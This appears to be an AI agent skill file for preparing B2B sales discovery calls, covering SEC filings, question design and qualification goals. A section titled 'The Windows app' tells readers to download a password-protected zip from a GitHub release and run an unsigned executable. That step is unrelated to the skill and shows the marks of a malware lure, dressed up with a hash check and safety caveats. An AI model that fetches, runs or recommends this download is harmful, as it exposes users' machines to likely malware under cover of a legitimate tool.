---
name: discovery-call-prep
description: Turns a prospect's public record and the last call notes into a discovery brief with the questions, risks and next step to earn. Use when the user asks for discovery call prep, discovery questions template, sales call prep sheet. For US B2B sales reps running first and second calls with buyers.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Discovery Call Prep

**Turns a prospect's public record and the last call notes into a discovery brief with the questions, risks and next step to earn.** Written for US B2B sales reps running first and second calls with buyers.

Use this skill when someone asks for:

- discovery call prep
- discovery questions template
- sales call prep sheet
- b2b discovery checklist

---

## The job

Reps walk into discovery with a generic question list, miss the buyer's actual trigger and end the call without a next step.

## What you get

1. Gather the account's public facts and the notes from the last conversation.
2. Write what the buyer said, what is still unverified and what the call has to confirm.
3. Build eight to ten open questions that map to the buyer's stated business problem.
4. Set the qualification goals and the next step you will ask for at the end of the call.

Output contract:

- brief - one page: buyer, trigger, timeline and what is still unverified
- questions - open questions only, no yes/no questions
- qualification - the five facts the call has to confirm
- next_step - the specific ask and the date to propose

## US specifics that matter

- Public US companies file Form 10-K with the SEC; large accelerated filers have 60 days after fiscal year end, accelerated filers 75 days and non-accelerated filers 90 days.
- A Form 8-K is due within 4 business days of the triggering event, so the filing list is the fastest public signal of a change.
- SEC EDGAR full-text search covers filings from 2001 onward for most registrants.
- NAICS codes from the US Census Bureau run to six digits, and a state Secretary of State registry confirms the legal entity and its standing.

## Guardrails (hard rules)

- Never build the brief from personal social profiles, leaked databases or bought contact data.
- Never state a number as fact when the source is a rep's memory; mark it as unverified.
- Never present the prep sheet as legal or compliance advice.
- Never write a discovery brief for a deal the rep does not own.

## Quickstart

### 1. Fill in the brief

`templates/discovery-brief.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_discovery_brief.py --input discovery-brief.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/discovery-call-prep.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Public facts worth pulling**

- SEC EDGAR filings: the 10-K for the business, the 8-K for recent events.
- The company's own newsroom and product pages.
- The state Secretary of State registry for entity name and standing.
- Public job postings for what the team is building right now.

**Questions that open a topic**

- Ask about the process: how does this work get done today, and who does each step?
- Ask for the last instance: what happened the last time this broke?
- Ask about cost in the buyer's own words, not a percentage.
- Avoid yes/no questions; they produce nothing to write down.

**What to confirm before a demo**

- Who signs, who uses it and who can block the deal.
- The deadline and what happens if the date slips.
- The budget owner and the range they can approve.
- The process the buyer has to follow to buy.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/discovery-call-prep.md` - What to verify before a US discovery call
- `templates/discovery-brief.yaml` - the brief to fill in
- `scripts/build_discovery_brief.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_discovery_brief.py --input discovery-brief.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
